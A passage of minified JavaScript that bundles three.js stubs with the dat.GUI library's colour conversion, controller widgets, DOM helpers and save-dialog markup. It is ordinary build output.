instead.")},_.loadCompressedTextureCube=function(){console.error("THREE.ImageUtils.loadCompressedTextureCube has been removed. Use THREE.DDSLoader instead.")};function Fl(e,t){var i=e.__state.conversionName.toString(),n=Math.round(e.r),r=Math.round(e.g),o=Math.round(e.b),a=e.a,s=Math.round(e.h),c=e.s.toFixed(1),l=e.v.toFixed(1);if(t||"THREE_CHAR_HEX"===i||"SIX_CHAR_HEX"===i){for(var h=e.hex.toString(16);h.length<6;)h="0"+h;return"#"+h}return"CSS_RGB"===i?"rgb("+n+","+r+","+o+")":"CSS_RGBA"===i?"rgba("+n+","+r+","+o+","+a+")":"HEX"===i?"0x"+e.hex.toString(16):"RGB_ARRAY"===i?"["+n+","+r+","+o+"]":"RGBA_ARRAY"===i?"["+n+","+r+","+o+","+a+"]":"RGB_OBJ"===i?"{r:"+n+",g:"+r+",b:"+o+"}":"RGBA_OBJ"===i?"{r:"+n+",g:"+r+",b:"+o+",a:"+a+"}":"HSV_OBJ"===i?"{h:"+s+",s:"+c+",v:"+l+"}":"HSVA_OBJ"===i?"{h:"+s+",s:"+c+",v:"+l+",a:"+a+"}":"unknown format"}"undefined"!=typeof __THREE_DEVTOOLS__&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("register",{detail:{revision:"110dev"}}));var Nl=Array.prototype.forEach,jl=Array.prototype.slice,Ul={BREAK:{},extend:function(e){return this.each(jl.call(arguments,1),(function(t){(this.isObject(t)?Object.keys(t):[]).forEach(function(i){this.isUndefined(t[i])||(e[i]=t[i])}.bind(this))}),this),e},defaults:function(e){return this.each(jl.call(arguments,1),(function(t){(this.isObject(t)?Object.keys(t):[]).forEach(function(i){this.isUndefined(e[i])&&(e[i]=t[i])}.bind(this))}),this),e},compose:function(){var e=jl.call(arguments);return function(){for(var t=jl.call(arguments),i=e.length-1;i>=0;i--)t=[e[i].apply(this,t)];return t[0]}},each:function(e,t,i){if(e)if(Nl&&e.forEach&&e.forEach===Nl)e.forEach(t,i);else if(e.length===e.length+0){var n,r=void 0;for(r=0,n=e.length;r<n;r++)if(r in e&&t.call(i,e[r],r)===this.BREAK)return}else for(var o in e)if(t.call(i,e[o],o)===this.BREAK)return},defer:function(e){setTimeout(e,0)},debounce:function(e,t,i){var n=void 0;return function(){var r=this,o=arguments;function a(){n=null,i||e.apply(r,o)}var s=i||!n;clearTimeout(n),n=setTimeout(a,t),s&&e.apply(r,o)}},toArray:function(e){return e.toArray?e.toArray():jl.call(e)},isUndefined:function(e){return void 0===e},isNull:function(e){return null===e},isNaN:function(e){function t(t){return e.apply(this,arguments)}return t.toString=function(){return e.toString()},t}((function(e){return isNaN(e)})),isArray:Array.isArray||function(e){return e.constructor===Array},isObject:function(e){return e===Object(e)},isNumber:function(e){return e===e+0},isString:function(e){return e===e+""},isBoolean:function(e){return!1===e||!0===e},isFunction:function(e){return"[object Function]"===Object.prototype.toString.call(e)}},Vl=[{litmus:Ul.isString,conversions:{THREE_CHAR_HEX:{read:function(e){var t=e.match(/^#([A-F0-9])([A-F0-9])([A-F0-9])$/i);return null!==t&&{space:"HEX",hex:parseInt("0x"+t[1].toString()+t[1].toString()+t[2].toString()+t[2].toString()+t[3].toString()+t[3].toString(),0)}},write:Fl},SIX_CHAR_HEX:{read:function(e){var t=e.match(/^#([A-F0-9]{6})$/i);return null!==t&&{space:"HEX",hex:parseInt("0x"+t[1].toString(),0)}},write:Fl},CSS_RGB:{read:function(e){var t=e.match(/^rgb\(\s*(.+)\s*,\s*(.+)\s*,\s*(.+)\s*\)/);return null!==t&&{space:"RGB",r:parseFloat(t[1]),g:parseFloat(t[2]),b:parseFloat(t[3])}},write:Fl},CSS_RGBA:{read:function(e){var t=e.match(/^rgba\(\s*(.+)\s*,\s*(.+)\s*,\s*(.+)\s*,\s*(.+)\s*\)/);return null!==t&&{space:"RGB",r:parseFloat(t[1]),g:parseFloat(t[2]),b:parseFloat(t[3]),a:parseFloat(t[4])}},write:Fl}}},{litmus:Ul.isNumber,conversions:{HEX:{read:function(e){return{space:"HEX",hex:e,conversionName:"HEX"}},write:function(e){return e.hex}}}},{litmus:Ul.isArray,conversions:{RGB_ARRAY:{read:function(e){return 3===e.length&&{space:"RGB",r:e[0],g:e[1],b:e[2]}},write:function(e){return[e.r,e.g,e.b]}},RGBA_ARRAY:{read:function(e){return 4===e.length&&{space:"RGB",r:e[0],g:e[1],b:e[2],a:e[3]}},write:function(e){return[e.r,e.g,e.b,e.a]}}}},{litmus:Ul.isObject,conversions:{RGBA_OBJ:{read:function(e){return!!(Ul.isNumber(e.r)&&Ul.isNumber(e.g)&&Ul.isNumber(e.b)&&Ul.isNumber(e.a))&&{space:"RGB",r:e.r,g:e.g,b:e.b,a:e.a}},write:function(e){return{r:e.r,g:e.g,b:e.b,a:e.a}}},RGB_OBJ:{read:function(e){return!!(Ul.isNumber(e.r)&&Ul.isNumber(e.g)&&Ul.isNumber(e.b))&&{space:"RGB",r:e.r,g:e.g,b:e.b}},write:function(e){return{r:e.r,g:e.g,b:e.b}}},HSVA_OBJ:{read:function(e){return!!(Ul.isNumber(e.h)&&Ul.isNumber(e.s)&&Ul.isNumber(e.v)&&Ul.isNumber(e.a))&&{space:"HSV",h:e.h,s:e.s,v:e.v,a:e.a}},write:function(e){return{h:e.h,s:e.s,v:e.v,a:e.a}}},HSV_OBJ:{read:function(e){return!!(Ul.isNumber(e.h)&&Ul.isNumber(e.s)&&Ul.isNumber(e.v))&&{space:"HSV",h:e.h,s:e.s,v:e.v}},write:function(e){return{h:e.h,s:e.s,v:e.v}}}}}],Hl=void 0,Gl=void 0,Wl=function(){Gl=!1;var e=arguments.length>1?Ul.toArray(arguments):arguments[0];return Ul.each(Vl,(function(t){if(t.litmus(e))return Ul.each(t.conversions,(function(t,i){if(Hl=t.read(e),!1===Gl&&!1!==Hl)return Gl=Hl,Hl.conversionName=i,Hl.conversion=t,Ul.BREAK})),Ul.BREAK})),Gl},ql=void 0,Xl={hsv_to_rgb:function(e,t,i){var n=Math.floor(e/60)%6,r=e/60-Math.floor(e/60),o=i*(1-t),a=i*(1-r*t),s=i*(1-(1-r)*t),c=[[i,s,o],[a,i,o],[o,i,s],[o,a,i],[s,o,i],[i,o,a]][n];return{r:255*c[0],g:255*c[1],b:255*c[2]}},rgb_to_hsv:function(e,t,i){var n=Math.min(e,t,i),r=Math.max(e,t,i),o=r-n,a=void 0;return 0===r?{h:NaN,s:0,v:0}:(a=e===r?(t-i)/o:t===r?2+(i-e)/o:4+(e-t)/o,(a/=6)<0&&(a+=1),{h:360*a,s:o/r,v:r/255})},rgb_to_hex:function(e,t,i){var n=this.hex_with_component(0,2,e);return n=this.hex_with_component(n,1,t),n=this.hex_with_component(n,0,i)},component_from_hex:function(e,t){return e>>8*t&255},hex_with_component:function(e,t,i){return i<<(ql=8*t)|e&~(255<<ql)}},Yl="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},Zl=function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")},Ql=function(){function e(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}return function(t,i,n){return i&&e(t.prototype,i),n&&e(t,n),t}}(),$l=function e(t,i,n){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,i);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,i,n)}if("value"in r)return r.value;var a=r.get;return void 0!==a?a.call(n):void 0},Jl=function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)},Kl=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t},eh=function(){function e(){if(Zl(this,e),this.__state=Wl.apply(this,arguments),!1===this.__state)throw new Error("Failed to interpret color arguments");this.__state.a=this.__state.a||1}return Ql(e,[{key:"toString",value:function(){return Fl(this)}},{key:"toHexString",value:function(){return Fl(this,!0)}},{key:"toOriginal",value:function(){return this.__state.conversion.write(this)}}]),e}();function th(e,t,i){Object.defineProperty(e,t,{get:function(){return"RGB"===this.__state.space?this.__state[t]:(eh.recalculateRGB(this,t,i),this.__state[t])},set:function(e){"RGB"!==this.__state.space&&(eh.recalculateRGB(this,t,i),this.__state.space="RGB"),this.__state[t]=e}})}function ih(e,t){Object.defineProperty(e,t,{get:function(){return"HSV"===this.__state.space?this.__state[t]:(eh.recalculateHSV(this),this.__state[t])},set:function(e){"HSV"!==this.__state.space&&(eh.recalculateHSV(this),this.__state.space="HSV"),this.__state[t]=e}})}eh.recalculateRGB=function(e,t,i){if("HEX"===e.__state.space)e.__state[t]=Xl.component_from_hex(e.__state.hex,i);else{if("HSV"!==e.__state.space)throw new Error("Corrupted color state");Ul.extend(e.__state,Xl.hsv_to_rgb(e.__state.h,e.__state.s,e.__state.v))}},eh.recalculateHSV=function(e){var t=Xl.rgb_to_hsv(e.r,e.g,e.b);Ul.extend(e.__state,{s:t.s,v:t.v}),Ul.isNaN(t.h)?Ul.isUndefined(e.__state.h)&&(e.__state.h=0):e.__state.h=t.h},eh.COMPONENTS=["r","g","b","h","s","v","hex","a"],th(eh.prototype,"r",2),th(eh.prototype,"g",1),th(eh.prototype,"b",0),ih(eh.prototype,"h"),ih(eh.prototype,"s"),ih(eh.prototype,"v"),Object.defineProperty(eh.prototype,"a",{get:function(){return this.__state.a},set:function(e){this.__state.a=e}}),Object.defineProperty(eh.prototype,"hex",{get:function(){return"HEX"!==!this.__state.space&&(this.__state.hex=Xl.rgb_to_hex(this.r,this.g,this.b)),this.__state.hex},set:function(e){this.__state.space="HEX",this.__state.hex=e}});var nh=function(){function e(t,i){Zl(this,e),this.initialValue=t[i],this.domElement=document.createElement("div"),this.object=t,this.property=i,this.__onChange=void 0,this.__onFinishChange=void 0}return Ql(e,[{key:"onChange",value:function(e){return this.__onChange=e,this}},{key:"onFinishChange",value:function(e){return this.__onFinishChange=e,this}},{key:"setValue",value:function(e){return this.object[this.property]=e,this.__onChange&&this.__onChange.call(this,e),this.updateDisplay(),this}},{key:"getValue",value:function(){return this.object[this.property]}},{key:"updateDisplay",value:function(){return this}},{key:"isModified",value:function(){return this.initialValue!==this.getValue()}}]),e}(),rh={};Ul.each({HTMLEvents:["change"],MouseEvents:["click","mousemove","mousedown","mouseup","mouseover"],KeyboardEvents:["keydown"]},(function(e,t){Ul.each(e,(function(e){rh[e]=t}))}));var oh=/(\d+(\.\d+)?)px/;function ah(e){if("0"===e||Ul.isUndefined(e))return 0;var t=e.match(oh);return Ul.isNull(t)?0:parseFloat(t[1])}var sh={makeSelectable:function(e,t){void 0!==e&&void 0!==e.style&&(e.onselectstart=t?function(){return!1}:function(){},e.style.MozUserSelect=t?"auto":"none",e.style.KhtmlUserSelect=t?"auto":"none",e.unselectable=t?"on":"off")},makeFullscreen:function(e,t,i){var n=i,r=t;Ul.isUndefined(r)&&(r=!0),Ul.isUndefined(n)&&(n=!0),e.style.position="absolute",r&&(e.style.left=0,e.style.right=0),n&&(e.style.top=0,e.style.bottom=0)},fakeEvent:function(e,t,i,n){var r=i||{},o=rh[t];if(!o)throw new Error("Event type "+t+" not supported.");var a=document.createEvent(o);switch(o){case"MouseEvents":var s=r.x||r.clientX||0,c=r.y||r.clientY||0;a.initMouseEvent(t,r.bubbles||!1,r.cancelable||!0,window,r.clickCount||1,0,0,s,c,!1,!1,!1,!1,0,null);break;case"KeyboardEvents":var l=a.initKeyboardEvent||a.initKeyEvent;Ul.defaults(r,{cancelable:!0,ctrlKey:!1,altKey:!1,shiftKey:!1,metaKey:!1,keyCode:void 0,charCode:void 0}),l(t,r.bubbles||!1,r.cancelable,window,r.ctrlKey,r.altKey,r.shiftKey,r.metaKey,r.keyCode,r.charCode);break;default:a.initEvent(t,r.bubbles||!1,r.cancelable||!0)}Ul.defaults(a,n),e.dispatchEvent(a)},bind:function(e,t,i,n){var r=n||!1;return e.addEventListener?e.addEventListener(t,i,r):e.attachEvent&&e.attachEvent("on"+t,i),sh},unbind:function(e,t,i,n){var r=n||!1;return e.removeEventListener?e.removeEventListener(t,i,r):e.detachEvent&&e.detachEvent("on"+t,i),sh},addClass:function(e,t){if(void 0===e.className)e.className=t;else if(e.className!==t){var i=e.className.split(/ +/);-1===i.indexOf(t)&&(i.push(t),e.className=i.join(" ").replace(/^\s+/,"").replace(/\s+$/,""))}return sh},removeClass:function(e,t){if(t)if(e.className===t)e.removeAttribute("class");else{var i=e.className.split(/ +/),n=i.indexOf(t);-1!==n&&(i.splice(n,1),e.className=i.join(" "))}else e.className=void 0;return sh},hasClass:function(e,t){return new RegExp("(?:^|\\s+)"+t+"(?:\\s+|$)").test(e.className)||!1},getWidth:function(e){var t=getComputedStyle(e);return ah(t["border-left-width"])+ah(t["border-right-width"])+ah(t["padding-left"])+ah(t["padding-right"])+ah(t.width)},getHeight:function(e){var t=getComputedStyle(e);return ah(t["border-top-width"])+ah(t["border-bottom-width"])+ah(t["padding-top"])+ah(t["padding-bottom"])+ah(t.height)},getOffset:function(e){var t=e,i={left:0,top:0};if(t.offsetParent)do{i.left+=t.offsetLeft,i.top+=t.offsetTop,t=t.offsetParent}while(t);return i},isActive:function(e){return e===document.activeElement&&(e.type||e.href)}},ch=function(e){function t(e,i){Zl(this,t);var n=Kl(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,i)),r=n;return n.__prev=n.getValue(),n.__checkbox=document.createElement("input"),n.__checkbox.setAttribute("type","checkbox"),sh.bind(n.__checkbox,"change",(function(){r.setValue(!r.__prev)}),!1),n.domElement.appendChild(n.__checkbox),n.updateDisplay(),n}return Jl(t,e),Ql(t,[{key:"setValue",value:function(e){var i=$l(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"setValue",this).call(this,e);return this.__onFinishChange&&this.__onFinishChange.call(this,this.getValue()),this.__prev=this.getValue(),i}},{key:"updateDisplay",value:function(){return!0===this.getValue()?(this.__checkbox.setAttribute("checked","checked"),this.__checkbox.checked=!0,this.__prev=!0):(this.__checkbox.checked=!1,this.__prev=!1),$l(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"updateDisplay",this).call(this)}}]),t}(nh),lh=function(e){function t(e,i,n){Zl(this,t);var r=Kl(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,i)),o=n,a=r;if(r.__select=document.createElement("select"),Ul.isArray(o)){var s={};Ul.each(o,(function(e){s[e]=e})),o=s}return Ul.each(o,(function(e,t){var i=document.createElement("option");i.innerHTML=t,i.setAttribute("value",e),a.__select.appendChild(i)})),r.updateDisplay(),sh.bind(r.__select,"change",(function(){var e=this.options[this.selectedIndex].value;a.setValue(e)})),r.domElement.appendChild(r.__select),r}return Jl(t,e),Ql(t,[{key:"setValue",value:function(e){var i=$l(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"setValue",this).call(this,e);return this.__onFinishChange&&this.__onFinishChange.call(this,this.getValue()),i}},{key:"updateDisplay",value:function(){return sh.isActive(this.__select)?this:(this.__select.value=this.getValue(),$l(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"updateDisplay",this).call(this))}}]),t}(nh),hh=function(e){function t(e,i){Zl(this,t);var n=Kl(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,i)),r=n;function o(){r.setValue(r.__input.value)}return n.__input=document.createElement("input"),n.__input.setAttribute("type","text"),sh.bind(n.__input,"keyup",o),sh.bind(n.__input,"change",o),sh.bind(n.__input,"blur",(function(){r.__onFinishChange&&r.__onFinishChange.call(r,r.getValue())})),sh.bind(n.__input,"keydown",(function(e){13===e.keyCode&&this.blur()})),n.updateDisplay(),n.domElement.appendChild(n.__input),n}return Jl(t,e),Ql(t,[{key:"updateDisplay",value:function(){return sh.isActive(this.__input)||(this.__input.value=this.getValue()),$l(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"updateDisplay",this).call(this)}}]),t}(nh);function uh(e){var t=e.toString();return t.indexOf(".")>-1?t.length-t.indexOf(".")-1:0}var dh=function(e){function t(e,i,n){Zl(this,t);var r=Kl(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,i)),o=n||{};return r.__min=o.min,r.__max=o.max,r.__step=o.step,Ul.isUndefined(r.__step)?0===r.initialValue?r.__impliedStep=1:r.__impliedStep=Math.pow(10,Math.floor(Math.log(Math.abs(r.initialValue))/Math.LN10))/10:r.__impliedStep=r.__step,r.__precision=uh(r.__impliedStep),r}return Jl(t,e),Ql(t,[{key:"setValue",value:function(e){var i=e;return void 0!==this.__min&&i<this.__min?i=this.__min:void 0!==this.__max&&i>this.__max&&(i=this.__max),void 0!==this.__step&&i%this.__step!=0&&(i=Math.round(i/this.__step)*this.__step),$l(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"setValue",this).call(this,i)}},{key:"min",value:function(e){return this.__min=e,this}},{key:"max",value:function(e){return this.__max=e,this}},{key:"step",value:function(e){return this.__step=e,this.__impliedStep=e,this.__precision=uh(e),this}}]),t}(nh);var ph=function(e){function t(e,i,n){Zl(this,t);var r=Kl(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,i,n));r.__truncationSuspended=!1;var o=r,a=void 0;function s(){o.__onFinishChange&&o.__onFinishChange.call(o,o.getValue())}function c(e){var t=a-e.clientY;o.setValue(o.getValue()+t*o.__impliedStep),a=e.clientY}function l(){sh.unbind(window,"mousemove",c),sh.unbind(window,"mouseup",l),s()}return r.__input=document.createElement("input"),r.__input.setAttribute("type","text"),sh.bind(r.__input,"change",(function(){var e=parseFloat(o.__input.value);Ul.isNaN(e)||o.setValue(e)})),sh.bind(r.__input,"blur",(function(){s()})),sh.bind(r.__input,"mousedown",(function(e){sh.bind(window,"mousemove",c),sh.bind(window,"mouseup",l),a=e.clientY})),sh.bind(r.__input,"keydown",(function(e){13===e.keyCode&&(o.__truncationSuspended=!0,this.blur(),o.__truncationSuspended=!1,s())})),r.updateDisplay(),r.domElement.appendChild(r.__input),r}return Jl(t,e),Ql(t,[{key:"updateDisplay",value:function(){var e,i,n;return this.__input.value=this.__truncationSuspended?this.getValue():(e=this.getValue(),i=this.__precision,n=Math.pow(10,i),Math.round(e*n)/n),$l(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"updateDisplay",this).call(this)}}]),t}(dh);function fh(e,t,i,n,r){return n+(e-t)/(i-t)*(r-n)}var mh=function(e){function t(e,i,n,r,o){Zl(this,t);var a=Kl(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,i,{min:n,max:r,step:o})),s=a;function c(e){e.preventDefault();var t=s.__background.getBoundingClientRect();return s.setValue(fh(e.clientX,t.left,t.right,s.__min,s.__max)),!1}function l(){sh.unbind(window,"mousemove",c),sh.unbind(window,"mouseup",l),s.__onFinishChange&&s.__onFinishChange.call(s,s.getValue())}function h(e){var t=e.touches[0].clientX,i=s.__background.getBoundingClientRect();s.setValue(fh(t,i.left,i.right,s.__min,s.__max))}function u(){sh.unbind(window,"touchmove",h),sh.unbind(window,"touchend",u),s.__onFinishChange&&s.__onFinishChange.call(s,s.getValue())}return a.__background=document.createElement("div"),a.__foreground=document.createElement("div"),sh.bind(a.__background,"mousedown",(function(e){document.activeElement.blur(),sh.bind(window,"mousemove",c),sh.bind(window,"mouseup",l),c(e)})),sh.bind(a.__background,"touchstart",(function(e){if(1!==e.touches.length)return;sh.bind(window,"touchmove",h),sh.bind(window,"touchend",u),h(e)})),sh.addClass(a.__background,"slider"),sh.addClass(a.__foreground,"slider-fg"),a.updateDisplay(),a.__background.appendChild(a.__foreground),a.domElement.appendChild(a.__background),a}return Jl(t,e),Ql(t,[{key:"updateDisplay",value:function(){var e=(this.getValue()-this.__min)/(this.__max-this.__min);return this.__foreground.style.width=100*e+"%",$l(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"updateDisplay",this).call(this)}}]),t}(dh),vh=function(e){function t(e,i,n){Zl(this,t);var r=Kl(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,i)),o=r;return r.__button=document.createElement("div"),r.__button.innerHTML=void 0===n?"Fire":n,sh.bind(r.__button,"click",(function(e){return e.preventDefault(),o.fire(),!1})),sh.addClass(r.__button,"button"),r.domElement.appendChild(r.__button),r}return Jl(t,e),Ql(t,[{key:"fire",value:function(){this.__onChange&&this.__onChange.call(this),this.getValue().call(this.object),this.__onFinishChange&&this.__onFinishChange.call(this,this.getValue())}}]),t}(nh),gh=function(e){function t(e,i){Zl(this,t);var n=Kl(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,i));n.__color=new eh(n.getValue()),n.__temp=new eh(0);var r=n;n.domElement=document.createElement("div"),sh.makeSelectable(n.domElement,!1),n.__selector=document.createElement("div"),n.__selector.className="selector",n.__saturation_field=document.createElement("div"),n.__saturation_field.className="saturation-field",n.__field_knob=document.createElement("div"),n.__field_knob.className="field-knob",n.__field_knob_border="2px solid ",n.__hue_knob=document.createElement("div"),n.__hue_knob.className="hue-knob",n.__hue_field=document.createElement("div"),n.__hue_field.className="hue-field",n.__input=document.createElement("input"),n.__input.type="text",n.__input_textShadow="0 1px 1px ",sh.bind(n.__input,"keydown",(function(e){13===e.keyCode&&u.call(this)})),sh.bind(n.__input,"blur",u),sh.bind(n.__selector,"mousedown",(function(){sh.addClass(this,"drag").bind(window,"mouseup",(function(){sh.removeClass(r.__selector,"drag")}))})),sh.bind(n.__selector,"touchstart",(function(){sh.addClass(this,"drag").bind(window,"touchend",(function(){sh.removeClass(r.__selector,"drag")}))}));var o,a=document.createElement("div");function s(e){p(e),sh.bind(window,"mousemove",p),sh.bind(window,"touchmove",p),sh.bind(window,"mouseup",l),sh.bind(window,"touchend",l)}function c(e){f(e),sh.bind(window,"mousemove",f),sh.bind(window,"touchmove",f),sh.bind(window,"mouseup",h),sh.bind(window,"touchend",h)}function l(){sh.unbind(window,"mousemove",p),sh.unbind(window,"touchmove",p),sh.unbind(window,"mouseup",l),sh.unbind(window,"touchend",l),d()}function h(){sh.unbind(window,"mousemove",f),sh.unbind(window,"touchmove",f),sh.unbind(window,"mouseup",h),sh.unbind(window,"touchend",h),d()}function u(){var e=Wl(this.value);!1!==e?(r.__color.__state=e,r.setValue(r.__color.toOriginal())):this.value=r.__color.toString()}function d(){r.__onFinishChange&&r.__onFinishChange.call(r,r.__color.toOriginal())}function p(e){-1===e.type.indexOf("touch")&&e.preventDefault();var t=r.__saturation_field.getBoundingClientRect(),i=e.touches&&e.touches[0]||e,n=i.clientX,o=i.clientY,a=(n-t.left)/(t.right-t.left),s=1-(o-t.top)/(t.bottom-t.top);return s>1?s=1:s<0&&(s=0),a>1?a=1:a<0&&(a=0),r.__color.v=s,r.__color.s=a,r.setValue(r.__color.toOriginal()),!1}function f(e){-1===e.type.indexOf("touch")&&e.preventDefault();var t=r.__hue_field.getBoundingClientRect(),i=1-((e.touches&&e.touches[0]||e).clientY-t.top)/(t.bottom-t.top);return i>1?i=1:i<0&&(i=0),r.__color.h=360*i,r.setValue(r.__color.toOriginal()),!1}return Ul.extend(n.__selector.style,{width:"122px",height:"102px",padding:"3px",backgroundColor:"#222",boxShadow:"0px 1px 3px rgba(0,0,0,0.3)"}),Ul.extend(n.__field_knob.style,{position:"absolute",width:"12px",height:"12px",border:n.__field_knob_border+(n.__color.v<.5?"#fff":"#000"),boxShadow:"0px 1px 3px rgba(0,0,0,0.5)",borderRadius:"12px",zIndex:1}),Ul.extend(n.__hue_knob.style,{position:"absolute",width:"15px",height:"2px",borderRight:"4px solid #fff",zIndex:1}),Ul.extend(n.__saturation_field.style,{width:"100px",height:"100px",border:"1px solid #555",marginRight:"3px",display:"inline-block",cursor:"pointer"}),Ul.extend(a.style,{width:"100%",height:"100%",background:"none"}),bh(a,"top","rgba(0,0,0,0)","#000"),Ul.extend(n.__hue_field.style,{width:"15px",height:"100px",border:"1px solid #555",cursor:"ns-resize",position:"absolute",top:"3px",right:"3px"}),(o=n.__hue_field).style.background="",o.style.cssText+="background: -moz-linear-gradient(top,  #ff0000 0%, #ff00ff 17%, #0000ff 34%, #00ffff 50%, #00ff00 67%, #ffff00 84%, #ff0000 100%);",o.style.cssText+="background: -webkit-linear-gradient(top,  #ff0000 0%,#ff00ff 17%,#0000ff 34%,#00ffff 50%,#00ff00 67%,#ffff00 84%,#ff0000 100%);",o.style.cssText+="background: -o-linear-gradient(top,  #ff0000 0%,#ff00ff 17%,#0000ff 34%,#00ffff 50%,#00ff00 67%,#ffff00 84%,#ff0000 100%);",o.style.cssText+="background: -ms-linear-gradient(top,  #ff0000 0%,#ff00ff 17%,#0000ff 34%,#00ffff 50%,#00ff00 67%,#ffff00 84%,#ff0000 100%);",o.style.cssText+="background: linear-gradient(top,  #ff0000 0%,#ff00ff 17%,#0000ff 34%,#00ffff 50%,#00ff00 67%,#ffff00 84%,#ff0000 100%);",Ul.extend(n.__input.style,{outline:"none",textAlign:"center",color:"#fff",border:0,fontWeight:"bold",textShadow:n.__input_textShadow+"rgba(0,0,0,0.7)"}),sh.bind(n.__saturation_field,"mousedown",s),sh.bind(n.__saturation_field,"touchstart",s),sh.bind(n.__field_knob,"mousedown",s),sh.bind(n.__field_knob,"touchstart",s),sh.bind(n.__hue_field,"mousedown",c),sh.bind(n.__hue_field,"touchstart",c),n.__saturation_field.appendChild(a),n.__selector.appendChild(n.__field_knob),n.__selector.appendChild(n.__saturation_field),n.__selector.appendChild(n.__hue_field),n.__hue_field.appendChild(n.__hue_knob),n.domElement.appendChild(n.__input),n.domElement.appendChild(n.__selector),n.updateDisplay(),n}return Jl(t,e),Ql(t,[{key:"updateDisplay",value:function(){var e=Wl(this.getValue());if(!1!==e){var t=!1;Ul.each(eh.COMPONENTS,(function(i){if(!Ul.isUndefined(e[i])&&!Ul.isUndefined(this.__color.__state[i])&&e[i]!==this.__color.__state[i])return t=!0,{}}),this),t&&Ul.extend(this.__color.__state,e)}Ul.extend(this.__temp.__state,this.__color.__state),this.__temp.a=1;var i=this.__color.v<.5||this.__color.s>.5?255:0,n=255-i;Ul.extend(this.__field_knob.style,{marginLeft:100*this.__color.s-7+"px",marginTop:100*(1-this.__color.v)-7+"px",backgroundColor:this.__temp.toHexString(),border:this.__field_knob_border+"rgb("+i+","+i+","+i+")"}),this.__hue_knob.style.marginTop=100*(1-this.__color.h/360)+"px",this.__temp.s=1,this.__temp.v=1,bh(this.__saturation_field,"left","#fff",this.__temp.toHexString()),this.__input.value=this.__color.toString(),Ul.extend(this.__input.style,{backgroundColor:this.__color.toHexString(),color:"rgb("+i+","+i+","+i+")",textShadow:this.__input_textShadow+"rgba("+n+","+n+","+n+",.7)"})}}]),t}(nh),yh=["-moz-","-o-","-webkit-","-ms-",""];function bh(e,t,i,n){e.style.background="",Ul.each(yh,(function(r){e.style.cssText+="background: "+r+"linear-gradient("+t+", "+i+" 0%, "+n+" 100%); "}))}var wh=function(e,t){var i=t||document,n=document.createElement("style");n.type="text/css",n.innerHTML=e;var r=i.getElementsByTagName("head")[0];try{r.appendChild(n)}catch(e){}},xh='<div id="dg-save" class="dg dialogue">\n\n  Here\'s the new load parameter for your <code>GUI</code>\'s constructor:\n\n  <textarea id="dg-new-constructor"></textarea>\n\n  <div id="dg-save-locally">\n\n    <input id="dg-local-storage" type="checkbox"/> Automatically save\n    values to <code>localStorage</code> on exit.\n\n    <div id="dg-local-explain">The values saved to <code>localStorage</code> will\n      override those passed to <code>dat.GUI</code>\'s constructor. This makes it\n      easier to work incrementally, but <code>localStorage</code> is fragile,\n      and your friends may not see the same values you do.\n\n    </div>\n\n  </div>\n\n</div>',_h=function(e,t){var i=e[t];return Ul.isArray(arguments[2])||Ul.isObject(arguments[2])?new lh(e,t,arguments[2]):Ul.isNumber(i)?Ul.isNumber(arguments[2])&&Ul.isNumber(arguments[3])?Ul.isNumber(arguments[4])?new mh(e,t,arguments[2],arguments[3],arguments[4]):new mh(e,t,arguments[2],arguments[3]):Ul.isNumber(arguments[4])?new ph(e,t,{min:arguments[2],max:arguments[3],step:arguments[4]}):new ph(e,t,{min:arguments[2],max:arguments[3]}):Ul.isString(i)?new hh(e,t):Ul.isFunction(i)?new vh(e,t,""):Ul.isBoolean(i)?new ch(e,t):null};var Mh=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||function(e){setTimeout(e,1e3/60)},Sh=function(){function e(){Zl(this,e),this.backgroundElement=document.createElement("div"),Ul.extend(this.backgroundElement.style,{backgroundColor:"rgba(0,0,0,0.8)",top:0,left:0,display:"none",zIndex:"1000",opacity:0,WebkitTransition:"opacity 0.2s linear",transition:"opacity 0.2s linear"}),sh.makeFullscreen(this.backgroundElement),this.backgroundElement.style.position="fixed",this.domElement=document.createElement("div"),Ul.extend(this.domElement.style,{position:"fixed",display:"none",zIndex:"1001",opacity:0,WebkitTransition:"-webkit-transform 0.2s ease-out, opacity 0.2s linear",transition:"transform 0.2s ease-out, opacity 0.2s linear"}),document.body.appendChild(this.backgroundElement),document.body.appendChild(this.domElement);var t=this;sh.bind(this.backgroundElement,"click",(function(){t.hide()}))}return Ql(e,[{key:"show",value:function(){var 